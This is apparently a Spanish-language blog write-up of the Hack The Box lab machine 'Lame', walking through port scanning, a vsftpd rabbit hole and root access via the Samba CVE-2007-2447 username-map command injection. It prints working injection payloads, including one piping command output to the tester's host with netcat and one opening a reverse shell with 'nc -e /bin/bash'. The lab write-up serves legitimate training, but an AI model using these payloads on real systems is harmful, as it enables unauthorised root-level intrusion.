---
layout: single
title: Lame - Hack The Box
excerpt: "Gracias a la versión de Samba 3.0.20, sera vulnerable a una ejecución remota de comandos (RCE) sin autenticarnos debido a que el username map script como en otros scripts definidos en smb.conf, se pasan datos no filtrados de usuario a /bin/sh. En el caso del username map script, esto puede ocurrir sin necesidad de autenticación."
date: 2025-10-12
classes: wide
header:
  teaser: /assets/images/htb-writeup-lame/logo_lame.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - Hackthebox
  - Pentesting
  - eJPTv2
tags:
  - writeup
  - eJPTv2
  - smb
  - CVE-2007-2447
  - USERNAME-MAP-SCRIPT-RCE
  - ReverseShell
---

![](/assets/images/htb-writeup-lame/logo_lame.png)

"Nos aprovecharemos la <span style="color:yellow">versión de smb 3.0.20</span> cual es vulnerable a **USERNAME MAP SCRIPT: RCE** -> CVE-2007-2447.
Nos va a permitir ejecutar comandos como <span style="color:blue">root</span> a través de un <span style="color:lightblue">share de smb</span> por una inyección de código malicioso."

## WRITE 
IP VÍCTIMA: 10.10.10.3 (víctima) TTL=  63 LINUX


#### RECONOCIMIENTO

Lo primero que vamos hacer es crear nuestro entorno de trabajo: <span style="color:lightblue">Lame</span>

Dentro usaremos la herramienta de s4vitar *mkt* cual nos generara las carpetas necesarias para tener todo más organizado; **Nmap...**

>**which** mkt.py | **xargs** **batcat** -l python

*Ver en que ubicación está una herramienta y ver su código*
*Adelante explicamos a tener batcat, que es un cat pero con esteroides*

Para empezar el reconocimiento, enviamos una traza ICMP a la <span style="color:red">IP</span> de la maquina víctima, para comprobar que tenemos conectividad, tenemos dos alternativas:

-Usar el script *whichSystem* que nos dirá directamente el equipo al que estamos atacando, por ende habrá tenido ping para dar la respuesta. Es más silencioso que nmap.

![](/assets/images/htb-writeup-lame/whichsystem_lame.png)


-Usar el comando *ping* <span style="color:red">10.10.10.3</span> <span style="color:yellow">-c</span> 1  <span style="color:yellow">-R</span>
*-R Lo que hace es un record route que consiste que a la hora de hacer la petición se lo envía a un nodo intermediario para que no sea directa la petición, al ser Windows no lo muestra.*

![](/assets/images/htb-writeup-lame/conectividad_lame.png)


Después de confirmar que tenemos conectividad, usaremos **nmap** para a ver que puertos tenemos abiertos y que protocolos/servicios tenemos.


**nmap** <span style="color:yellow">-p- --open -Pn -vvv -n -sS --min-rate 5000</span> <span style="color:red">10.10.10.3</span> <span style="color:yellow">-oG</span> <span style="color:pink">allPorts</span>
*Veremos porque el formato grepeable, es importante.*

![](/assets/images/htb-writeup-lame/nmap1_lame.png)


Una vez hecho, usaremos otra herramienta de s4vitar *extractports* al archivo allPorts
cual nos copiara los puertos, y escanearlos con nmap. 

![](/assets/images/htb-writeup-lame/extractports_lame.png)


**nmap** <span style="color:yellow">-sVC</span> <span style="color:yellow">-p</span><span style="color:purple">21,22,139,445,3632</span> <span style="color:red">10.10.10.3</span> <span style="color:yellow">-oN</span> <span style="color:pink">targeted</span> 
*Este formato lo emplearemos con batcat lenguaje java para verlo mejor*

![](/assets/images/htb-writeup-lame/nmap2_lame.png)


Una vez escaneado, usaremos batcat:
>https://github.com/sharkdp/bat.git

**batcat** <span style="color:pink">target</span> <span style="color:yellow">-l</span> <span style="color:orange">java</span>
*nos mostrara la salida en un formato más bonito, con java*

![](/assets/images/htb-writeup-lame/batcat_lame.png)


#### ANÁLISIS FTP: RECONOCIMIENTO

En el escaneo de nmap vemos que nos ha sacado que hay un login. con <span style="color:blue">anonymous</span>.

![](/assets/images/htb-writeup-lame/loganon_lame.png)


Con **locate** ftp | **grep** <span style="color:orange">".nse"</span>  vemos el script que se ha usado.

**ftp**-<span style="color:red">anon.nse</span>

![](/assets/images/htb-writeup-lame/scriptsftp_lame.png)


Vamos a mirar si hay algún contenido en el FTP entonces:

**ftp** <span style="color:red">10.10.10.3</span> -> <span style="color:blue">anonymous</span>: <span style="color:darkred">(pass_en_blanco)</span>

No habrá nada, archivos ni directorios.

![](/assets/images/htb-writeup-lame/logina_lame.png)


##### :)

*searchsploit* **vsftpd 2.3.4**

![](/assets/images/htb-writeup-lame/searchespftp_lame.png)


Miramos el código con el parámetro <span style="color:green">-x</span> /unix/remote/49757.py | batcat -l python

![](/assets/images/htb-writeup-lame/viscript_lame.png)


Como vemos usa un usuario con la **:)** cuando se conecta por netcat por el puerto 21 y la IP víctima, pone dichas credenciales y si funciona, se abre el puerto 6200 por donde recibe una shell.

![](/assets/images/htb-writeup-lame/howworkscrip_lame.png)

Tiene la versión de <span style="color:orange">vsftpd 2.3.4</span> cual es vulnerable.

Esta vulnerabilidad es más fácil que el anterior método, ya que en la versión <span style="color:DarkOrange">vsftpd 2.3.4</span> si ponemos "algo:)" de usuario nos abrirá un <span style="color:purple">puerto 6200</span> cual nos permitirá obtener una shell con privilegios (<span style="color:blue">root</span>). 

Esto es debido porque alguien entro a los repositorios oficiales y modifico el código fuente para que si colocas en el login un **:)** este se enlace a una sh con privilegios (<span style="color:blue">root</span>).

![](/assets/images/htb-writeup-lame/logvul_lame.png)

![](/assets/images/htb-writeup-lame/onw_lame.png)


Esto no es por aquí, es un **rabbit hole**.


#### ANÁLISIS SMB: RECONOCIMIENTO

![](/assets/images/htb-writeup-lame/recsamv_lame.png)


Agregamos en <span style="color:lightblue">/etc/</span><span style="color:grey">hosts</span> el **nombre del ordenador(loca)**, **FQDN** y **Dominio**. Para evitar problemas y así tener más compatibilidad en cuanto a usar el dominio en vez de la IP.

![](/assets/images/htb-writeup-lame/hosts_lame.png)


Por otro lado...
*searchsploit* **samba 3.0.2** 

Nos quedaremos con el primer exploit cual es una ejecución de comandos.

![](/assets/images/htb-writeup-lame/searsmb_lame.png)


Miramos el código con el parámetro <span style="color:green">-x</span> /unix/remote/16320.rb | batcat -l ruby

![](/assets/images/htb-writeup-lame/visscript_lame.png)


Nos dice que cuando nos conectemos a un share mediante el campo nombre podemos inyectar un código malicioso cual nos va a permitir ejecución de comandos.

"/= `nohup comando`"

![](/assets/images/htb-writeup-lame/howorksm_lame.png)


Con *netexec* podremos solicitar info del sistema y listar shares con <span style="color:blue">null sesión</span>.

![](/assets/images/htb-writeup-lame/listshares_lame.png)


Entraremos al <span style="color:lightblue">share tmp</span> ya que es al único que nos deja como <span style="color:blue">null sesión</span>.

![](/assets/images/htb-writeup-lame/accshare_lame.png)


#### USERNAME MAP SCRIPT: RCE

>Información acerca **CVE-2007-2447**:
> [Incibe CVE-2007-2447](https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2007-2447)

Dentro con **?** listamos los comandos.

![](/assets/images/htb-writeup-lame/listcomandosmb_lame.png)


Como estamos sin un usuario autenticado usaremos **logon** para usar el payload malicioso.
En el campo username pondremos:

>"/= `nohup comando`"

![](/assets/images/htb-writeup-lame/logon_lame.png)

Sintaxis para comprobar que funciona:
**logon**  "/= `nohup ping 10.10.16.10 -c1`"

Nos enviaremos un **ping** a nuestra máquina.

![](/assets/images/htb-writeup-lame/pinglog_lame.png)


Con *tcpdump* nos pondremos escucha para comprobar que recibimos la traza ICMP, y efectivamente la recibimos.

![](/assets/images/htb-writeup-lame/recping_lame.png)


Nos ponemos en escucha por el <span style="color:purple">puerto 444</span> para cuando establezcamos la *reverse shell*, recibir la conexión a nuestro host, de momento para ver la salida de algunos comandos.

![](/assets/images/htb-writeup-lame/confnc_lame.png)


Enviaremos un **whoami** para saber quien esta ejecutando los comandos.

**logon**  "/= `nohup whoami | nc 10.10.16.10 444`"

![](/assets/images/htb-writeup-lame/envcom_lame.png)


Recibimos a nuestro **netcat** orden del comando, estamos ejecutando comandos como <span style="color:blue">root</span>.

![](/assets/images/htb-writeup-lame/roo_lame.png)


##### REVERSE SHELL

Ahora si preparamos netcat para revershell:

![](/assets/images/htb-writeup-lame/confnc_lame.png)


**logon**  "/= `nohup nc -e /bin/bash 10.10.16.10 444`"

![](/assets/images/htb-writeup-lame/confrv_lame.png)

Por el otro lado recibiremos la conexión a nuestro nc en escucha.

![](/assets/images/htb-writeup-lame/recrv_lame.png)


#### SHELL INTERACTIVA: TRATAMIENTO TTY

1) **script** /dev/null -c bash

![](/assets/images/htb-writeup-lame/tty1_lame.png)


2) **CTRL** <span style="color:orange">+</span> **Z** para suspender netcat a segundo plano. (lo hago con otro puerto)

![](/assets/images/htb-writeup-lame/tty2_lame.png)


3) **stty** <span style="color:yellow">raw</span> <span style="color:green">-echo</span><span style="color:orange">;</span> <span style="color:yellow">fg</span>

![](/assets/images/htb-writeup-lame/tty3_lame.png)


4) **reset  xterm** (no esta bien la imagen)

![](/assets/images/htb-writeup-lame/tty3_lame.png)


5) **export TERM**<span style="color:yellow">=xterm</span>

![](/assets/images/htb-writeup-lame/tty5_lame.png)


Ya tendremos una  Shell totalmente interactiva !!

![](/assets/images/htb-writeup-lame/shell_interactiva.png)


#### BANDERA USUARIO

Nos vamos al home del usuario <span style="color:blue">makis </span>-> <span style="color:lightblue">makis/</span> y cogemos la bandera.

![](/assets/images/htb-writeup-lame/flaguser_lame.png)


#### BANDERA ROOT

Nos vamos al directorio <span style="color:blue">root </span>-> <span style="color:lightblue">root/</span> y cogemos la bandera.

![](/assets/images/htb-writeup-lame/flagroot_lame.png)
